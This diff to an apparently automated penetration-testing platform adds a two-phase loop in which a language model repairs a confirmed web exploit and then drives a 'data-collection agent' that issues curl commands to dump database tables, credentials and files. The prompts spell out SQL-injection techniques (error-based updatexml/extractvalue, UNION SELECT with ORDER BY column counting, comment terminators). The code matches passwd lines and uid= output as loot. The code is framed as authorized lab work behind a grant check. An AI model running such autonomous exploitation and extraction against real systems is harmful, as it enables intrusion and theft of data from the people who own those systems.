@@ -12800,110 +12800,241 @@ _POSTEX_TWEAKS = [
 ]
 
 
+_postex_ea_cache = {"t": 0.0, "fixes": None, "tweaks": None}
+
+
+def _postex_fixes_and_tweaks():
+    """(error_fixes, tweaks) as [(pattern, text)], loaded from the postex_web.yaml SKILL
+    (RAG-first — edit the YAML, not the code). Falls back to the in-code lists. 60s cache."""
+    import time as _t
+    if _postex_ea_cache["fixes"] is not None and _t.time() - _postex_ea_cache["t"] < 60:
+        return _postex_ea_cache["fixes"], _postex_ea_cache["tweaks"]
+    fixes, tweaks = list(_POSTEX_ERROR_FIXES), list(_POSTEX_TWEAKS)
+    try:
+        from common import vuln_skills as _vs
+        ea = _vs.postex_error_analysis() or {}
+        sf = [(r["match"], r["fix"]) for r in (ea.get("error_fixes") or [])
+              if isinstance(r, dict) and r.get("match") and r.get("fix")]
+        st = [(r["match"], r["tweak"]) for r in (ea.get("tweaks") or [])
+              if isinstance(r, dict) and r.get("match") and r.get("tweak")]
+        if sf:
+            fixes = sf
+        if st:
+            tweaks = st
+    except Exception:  # noqa: BLE001
+        pass
+    _postex_ea_cache.update(t=_t.time(), fixes=fixes, tweaks=tweaks)
+    return fixes, tweaks
+
+
 def _enumerate_postex_output(output):
     """Enumerate a post-ex command's output. Returns {errors, tweaks, exec, empty}:
-      * errors  — deterministic FIXES for a failed command,
+      * errors  — deterministic FIXES for a failed command (from the postex_web skill),
       * tweaks  — improvements when it worked but the output is encoded/truncated/partial,
       * exec    — the engine ran our input (progress, not failure).
     Structural discovery (which tables/columns/files) is left to the LLM, which reads the raw
     output; these give it the deterministic nudges for fixing and improving."""
     import re as _re
     low = (output or "").lower()
-    errors = [fix for pat, fix in _POSTEX_ERROR_FIXES if _re.search(pat, low)]
-    tweaks = [tw for pat, tw in _POSTEX_TWEAKS if _re.search(pat, output or "")]
-    return {"errors": errors, "tweaks": tweaks,
+    fixes, tweaks = _postex_fixes_and_tweaks()
+    errs = []
+    for pat, fix in fixes:
+        try:
+            if _re.search(pat, low, _re.I):
+                errs.append(fix)
+        except Exception:  # noqa: BLE001 — a bad regex from the YAML must not break enumeration
+            continue
+    tws = []
+    for pat, tw in tweaks:
+        try:
+            if _re.search(pat, output or "", _re.I):
+                tws.append(tw)
+        except Exception:  # noqa: BLE001
+            continue
+    return {"errors": errs, "tweaks": tws,
             "exec": _looks_like_injection_execution(output),
             "empty": not (output or "").strip()}
 
 
-def _run_postex_weaponize(cve, ip, port, vuln_class, confirmed_command, eid, run_id=None,
-                          objective=None, max_iters=4, model=None, session_cookie=None):
-    """Weaponize a CONFIRMED web exploit into EXTRACTED DATA: run a weaponization command,
-    ENUMERATE its output (fix errors, discover structure), and iterate — dump -> discover
-    tables/columns/files -> read the objective — until real data is extracted or the budget
-    runs out. Reuses the postex_web skill for the class. Stores the loot + a security_test.
-    GATED/impactful: the caller checks the grant. Returns {extracted, extracted_data, ...}."""
-    import time as _t, httpx as _hx
-    port = port or 80
-    run_id = run_id or f"postex_{cve}_{ip}_{int(_t.time())}"
+def _postex_run(command, ip, port):
+    """Run one post-ex command through the scope-gated listener; return its output."""
+    import httpx as _hx
     listener = os.environ.get("KALI_LISTENER_URL", "https://kali-listener:8019")
-    _vt = int(os.environ.get("VECTOR_RUN_TIMEOUT", "600"))
+    vt = int(os.environ.get("VECTOR_RUN_TIMEOUT", "600"))
+    try:
+        lr = _hx.post(f"{listener.rstrip('/')}/vectors/run",
+                      json={"command": command, "target": str(ip), "port": port, "timeout": vt},
+                      headers={"x-api-key": API_KEY}, verify=False, timeout=vt + 60)
+        d = lr.json() if lr.status_code < 400 else {}
+        return (d.get("output", "") if isinstance(d, dict) else "") or lr.text
+    except Exception as e:  # noqa: BLE001
+        return f"listener error: {e}"
+
+
+def _extract_injection_value(output):
+    """Pull a REAL extracted value from post-ex output: the ~<value>~ an error-based payload
+    prints, or a uid=/root: token. None if the injection didn't return a computed value."""
+    import re as _re
+    m = _re.search(r"~([^~<\s][^~<]{0,300})~", output or "")
+    if m and m.group(1).strip():
+        return m.group(1).strip()
+    m = _re.search(r"(uid=\d+\([^)]+\)|root:[^\s:]*:0:0:)", output or "")
+    return m.group(1) if m else None
+
+
+def _analyze_and_correct_exploit(cve, ip, port, command, vuln_class, eid, run_id, model=None,
+                                 session_cookie=None, max_iters=3):
+    """PHASE 1 — analyze the errors and CORRECT the exploit until the injection EXECUTES and
+    returns a real computed value (e.g. version() as ~<value>~). This proves a WORKING primitive
+    the collection phase can build on. Returns {corrected, command, diagnosis, sample, facts}."""
     try:
         from common import vuln_skills as _vs
         skill = _vs.postex_for(issue_type=vuln_class, name=vuln_class) or {}
     except Exception:  # noqa: BLE001
         skill = {}
-    weap = skill.get("weaponize", ""); proof = skill.get("proof", "")
-    obj = objective or skill.get("objective") or "extract the objective data (secret / credentials / file)"
-    tgt = f"http://{ip}:{port}"
-    auth = f"Send this Cookie in EVERY request: {session_cookie}. " if session_cookie else ""
-    facts = []
-    command = confirmed_command
-    output = ""; extracted = False; extracted_data = ""; iters = 0; llm_model = None
-    consecutive_errors = 0
+    weap = skill.get("weaponize", ""); tgt = f"http://{ip}:{port}"
+    auth = f"Send this Cookie in every request: {session_cookie}. " if session_cookie else ""
+    facts = []; output = ""; corrected = False; diagnosis = ""; sample = None; llm_model = None
     for it in range(1, max(1, max_iters) + 1):
-        iters = it
-        prompt = (f"AUTHORIZED lab pentest POST-EXPLOITATION. A {vuln_class} exploit is CONFIRMED on "
-                  f"{tgt}. {auth}Weaponize it to: {obj}.\n"
+        output = _postex_run(command, ip, port)
+        enum = _enumerate_postex_output(output)
+        for f in enum["errors"]:
+            facts.append("FIX: " + f)
+        sample = _extract_injection_value(output)
+        _poc_trace(run_id, "correct_run", iteration=it, run_output=output, prompt=command,
+                   extra={"errors": enum["errors"], "sample": sample})
+        if sample:                       # a real DB-computed value came back -> exploit WORKS
+            corrected = True
+            break
+        prompt = (f"AUTHORIZED lab pentest. CORRECT this {vuln_class} exploit so it EXECUTES and "
+                  f"returns a TEST value. {auth}Target {tgt}. Skill: {weap}\n"
+                  f"Command: {command}\nError output:\n{(output or '')[:1500]}\n"
+                  f"Deterministic hints: {'; '.join([f for f in facts if f.startswith('FIX')])[-700:]}\n"
+                  f"Diagnose the ROOT CAUSE (integer vs quoted context? wrong comment terminator? "
+                  f"wrong technique? WAF?) and return the CORRECTED command that makes the injection "
+                  f"return version() (or current_user) delimited as ~<value>~.\n"
+                  f"Return ONE JSON only: {{\"command\": \"<corrected single curl>\", "
+                  f"\"diagnosis\": \"<the root cause you found>\"}}.")
+        res = _llm_for_model(prompt, model=model, caller="postex_correct", num_predict=700)
+        if isinstance(res, dict) and res.get("model"):
+            llm_model = res["model"]
+        j = _poc_extract_json(res.get("response", "") if isinstance(res, dict) else "") or {}
+        diagnosis = str(j.get("diagnosis", ""))[:250]
+        if diagnosis:
+            facts.append("DIAGNOSIS: " + diagnosis)
+        nc = str(j.get("command") or "").strip()
+        if not nc:
+            break
+        command = nc
+    return {"corrected": corrected, "command": command, "diagnosis": diagnosis,
+            "sample": sample, "facts": facts, "llm_model": llm_model, "last_output": output}
+
+
+def _collect_data_agent(cve, ip, port, working_command, objective, vuln_class, eid, run_id,
+                        model=None, session_cookie=None, max_iters=5):
+    """PHASE 2 — the data-collection agent. Given a CORRECTED, WORKING extraction payload,
+    systematically collect the objective (enumerate columns -> dump the table -> page long
+    values), enumerating each output to fix/advance. Returns {extracted, data, command, facts}."""
+    try:
+        from common import vuln_skills as _vs
+        skill = _vs.postex_for(issue_type=vuln_class, name=vuln_class) or {}
+    except Exception:  # noqa: BLE001
+        skill = {}
+    weap = skill.get("weaponize", ""); proof = skill.get("proof", ""); tgt = f"http://{ip}:{port}"
+    auth = f"Send this Cookie in every request: {session_cookie}. " if session_cookie else ""
+    facts = []; command = working_command; output = ""; extracted = False; data = ""; llm_model = None
+    for it in range(1, max(1, max_iters) + 1):
+        prompt = (f"AUTHORIZED lab pentest DATA-COLLECTION agent. The {vuln_class} exploit is "
+                  f"CORRECTED and WORKING on {tgt}. {auth}Now COLLECT the objective: {objective}.\n"
                   f"Skill: {weap}\nProof required: {proof}\n"
-                  f"Confirmed primitive: {confirmed_command}\n"
-                  f"Last command: {command}\nLast output (ENUMERATE it):\n{(output or '(none yet)')[:1800]}\n"
-                  f"Learned so far: {'; '.join(facts[-6:]) or '(nothing yet)'}\n"
-                  f"Analyze the output: if it ERRORED, FIX the command; if the data is ENCODED / "
-                  f"TRUNCATED / PARTIAL, TWEAK the command to get clean, complete output "
-                  f"(decode base64/hex, page long values, group_concat all rows); if it revealed "
-                  f"structure (tables/columns/files/paths), use it to go DEEPER toward the "
-                  f"objective; if it already CONTAINS the objective data, set done=true.\n"
-                  f"Return ONE JSON only: {{\"command\": \"<next single curl command>\", "
-                  f"\"done\": <true iff the LAST output already contains the objective data>, "
-                  f"\"extracted\": \"<the objective data if present in the last output, else empty>\", "
-                  f"\"note\": \"<what you learned / what you're doing next>\"}}.")
-        try:
-            res = _llm_for_model(prompt, model=model, caller="postex_weaponize", num_predict=900)
-            if isinstance(res, dict) and res.get("model"):
-                llm_model = res["model"]
-            j = _poc_extract_json(res.get("response", "") if isinstance(res, dict) else "") or {}
-        except Exception:  # noqa: BLE001
-            j = {}
+                  f"Working payload: {working_command}\nLast command: {command}\n"
+                  f"Last output (ENUMERATE it):\n{(output or '(run the working payload first)')[:1800]}\n"
+                  f"Learned: {'; '.join(facts[-6:]) or '(nothing yet)'}\n"
+                  f"Reuse the WORKING payload shape and only change the SUBQUERY to reach the "
+                  f"objective. If a column/table name is wrong, enumerate it from "
+                  f"information_schema first. If a value is truncated (~…~ ~32 chars), page it. "
+                  f"If the objective data is already present, set done=true.\n"
+                  f"Return ONE JSON only: {{\"command\": \"<next single curl>\", "
+                  f"\"done\": <true iff the last output has the objective data>, "
+                  f"\"extracted\": \"<objective data if present, else empty>\", "
+                  f"\"note\": \"<what you learned / next step>\"}}.")
+        res = _llm_for_model(prompt, model=model, caller="postex_collect", num_predict=900)
+        if isinstance(res, dict) and res.get("model"):
+            llm_model = res["model"]
+        j = _poc_extract_json(res.get("response", "") if isinstance(res, dict) else "") or {}
         note = str(j.get("note", ""))[:200]
         if note:
             facts.append(note)
         if j.get("done") and (j.get("extracted") or output):
-            extracted = True
-            extracted_data = str(j.get("extracted") or output)[:2000]
-            _poc_trace(run_id, "postex_done", iteration=it,
-                       response=f"objective extracted: {extracted_data[:200]}")
+            extracted = True; data = str(j.get("extracted") or output)[:2000]
+            _poc_trace(run_id, "collect_done", iteration=it, response=f"collected: {data[:200]}")
             break
         command = str(j.get("command") or "").strip()
         if not command:
             break
-        try:
-            lr = _hx.post(f"{listener.rstrip('/')}/vectors/run",
-                          json={"command": command, "target": str(ip), "port": port, "timeout": _vt},
-                          headers={"x-api-key": API_KEY}, verify=False, timeout=_vt + 60)
-            d = lr.json() if lr.status_code < 400 else {}
-            output = (d.get("output", "") if isinstance(d, dict) else "") or lr.text
-        except Exception as e:  # noqa: BLE001
-            output = f"listener error: {e}"
-        enum = _enumerate_postex_output(output)   # <-- enumerate on the output
-        for fix in enum["errors"]:
-            facts.append("FIX: " + fix)
+        output = _postex_run(command, ip, port)
+        enum = _enumerate_postex_output(output)
+        for f in enum["errors"]:
+            facts.append("FIX: " + f)
         for tw in enum["tweaks"]:
-            facts.append("TWEAK: " + tw)          # improve the output (encoded/truncated/partial)
-        if enum["exec"]:
-            facts.append("primitive is executing (engine ran our input)")
-        # Anti-oscillation: if the command keeps ERRORING with no usable data, stop
-        # re-fixing the same syntax — switch technique / terminator entirely.
-        made_progress = bool(output.strip()) and not enum["errors"]
-        consecutive_errors = 0 if made_progress else consecutive_errors + 1
-        if consecutive_errors >= 2:
-            facts.append("NO PROGRESS after 2 error-fixes — SWITCH TECHNIQUE ENTIRELY: if "
-                         "error-based (updatexml/extractvalue) keeps failing, pivot to "
-                         "UNION SELECT (find the column count with ORDER BY N first) or to a "
-                         "boolean/time-based read; and change the comment terminator (-- - / # / ;%00).")
-        _poc_trace(run_id, "postex_run", iteration=it, run_output=output, prompt=command,
-                   extra={"errors": enum["errors"], "tweaks": enum["tweaks"], "exec": enum["exec"]})
-    security_test_id = None; log_path = _poc_run_file(run_id)
+            facts.append("TWEAK: " + tw)
+        val = _extract_injection_value(output)
+        if val:
+            facts.append(f"extracted value: {val[:80]}")
+        _poc_trace(run_id, "collect_run", iteration=it, run_output=output, prompt=command,
+                   extra={"errors": enum["errors"], "tweaks": enum["tweaks"], "value": val})
+    return {"extracted": extracted, "data": data, "command": command, "facts": facts,
+            "llm_model": llm_model}
+
+
+def _run_postex_weaponize(cve, ip, port, vuln_class, confirmed_command, eid, run_id=None,
+                          objective=None, max_iters=4, model=None, session_cookie=None):
+    """Weaponize a CONFIRMED web exploit in TWO phases: (1) analyze the errors and CORRECT the
+    exploit into a WORKING extraction primitive, then (2) run the data-collection agent to
+    collect the objective. GATED/impactful: the caller checks the grant. Stores the loot +
+    a security_test. Returns {corrected, extracted, extracted_data, diagnosis, ...}."""
+    import time as _t
+    port = port or 80
+    run_id = run_id or f"postex_{cve}_{ip}_{int(_t.time())}"
+    try:
+        from common import vuln_skills as _vs
+        skill = _vs.postex_for(issue_type=vuln_class, name=vuln_class) or {}
+    except Exception:  # noqa: BLE001
+        skill = {}
+    obj = objective or skill.get("objective") or "extract the objective data (secret / credentials / file)"
+    log_path = _poc_run_file(run_id)
+
+    # PHASE 1 — analyze errors + correct the exploit into a working extraction primitive.
+    correct_iters = max(2, max_iters // 2)
+    corr = _analyze_and_correct_exploit(cve, ip, port, confirmed_command, vuln_class, eid, run_id,
+                                        model=model, session_cookie=session_cookie, max_iters=correct_iters)
+    facts = list(corr["facts"])
+    if not corr["corrected"]:
+        _poc_index(cve, ip, run_id, log_path, False, correct_iters, None, eid)
+        try:
+            emit_webhook("exploit_weaponized", "poc",
+                         {"cve": cve, "target": ip, "vuln_class": vuln_class, "phase": "correct",
+                          "corrected": False, "extracted": False})
+        except Exception:  # noqa: BLE001
+            pass
+        return {"ok": True, "phase": "correct", "corrected": False, "extracted": False,
+                "objective": obj, "vuln_class": vuln_class, "diagnosis": corr["diagnosis"],
+                "final_command": corr["command"], "extracted_data": "", "iterations": correct_iters,
+                "security_test_id": None, "log_path": log_path, "facts": facts[-10:]}
+
+    working_command = corr["command"]
+    facts.append(f"CORRECTED: exploit works (sample: {str(corr.get('sample'))[:60]})")
+
+    # PHASE 2 — the data-collection agent uses the corrected exploit to collect the objective.
+    coll = _collect_data_agent(cve, ip, port, working_command, obj, vuln_class, eid, run_id,
+                               model=model, session_cookie=session_cookie, max_iters=max_iters)
+    facts += coll["facts"]
+    extracted = coll["extracted"]; extracted_data = coll["data"]
+    command = coll["command"] or working_command
+    llm_model = coll.get("llm_model") or corr.get("llm_model")
+    iters = correct_iters + max_iters
+
+    security_test_id = None
     if extracted:
         try:
             with get_db() as conn, conn.cursor() as cur:
@@ -12915,6 +13046,7 @@ def _run_postex_weaponize(cve, ip, port, vuln_class, confirmed_command, eid, run
                      command, (command.split(' ', 1)[0] if command else 'curl'),
                      Json({"expect_contains": extracted_data[:80]}), eid,
                      Json({"cve": cve, "vuln_class": vuln_class, "objective": obj,
+                           "corrected_command": working_command, "diagnosis": corr["diagnosis"],
                            "extracted": extracted_data[:1000], "postex": True, "iterations": iters,
                            "log": log_path, "llm_model": llm_model})))
                 security_test_id = str(cur.fetchone()[0]); conn.commit()
@@ -12923,13 +13055,15 @@ def _run_postex_weaponize(cve, ip, port, vuln_class, confirmed_command, eid, run
     _poc_index(cve, ip, run_id, log_path, extracted, iters, security_test_id, eid)
     try:
         emit_webhook("exploit_weaponized", "poc",
-                     {"cve": cve, "target": ip, "vuln_class": vuln_class, "extracted": extracted,
-                      "objective": obj, "security_test_id": security_test_id})
+                     {"cve": cve, "target": ip, "vuln_class": vuln_class, "corrected": True,
+                      "extracted": extracted, "objective": obj, "security_test_id": security_test_id})
     except Exception:  # noqa: BLE001
         pass
-    return {"ok": True, "extracted": extracted, "objective": obj, "vuln_class": vuln_class,
-            "extracted_data": extracted_data[:1000], "iterations": iters, "final_command": command,
-            "security_test_id": security_test_id, "log_path": log_path, "facts": facts[-8:]}
+    return {"ok": True, "phase": "collect", "corrected": True, "extracted": extracted,
+            "objective": obj, "vuln_class": vuln_class, "diagnosis": corr["diagnosis"],
+            "corrected_command": working_command, "extracted_data": extracted_data[:1000],
+            "iterations": iters, "final_command": command, "security_test_id": security_test_id,
+            "log_path": log_path, "facts": facts[-10:]}
 
 
 def _flag_exploit_confirmed(cve, ip, port, command, eid):
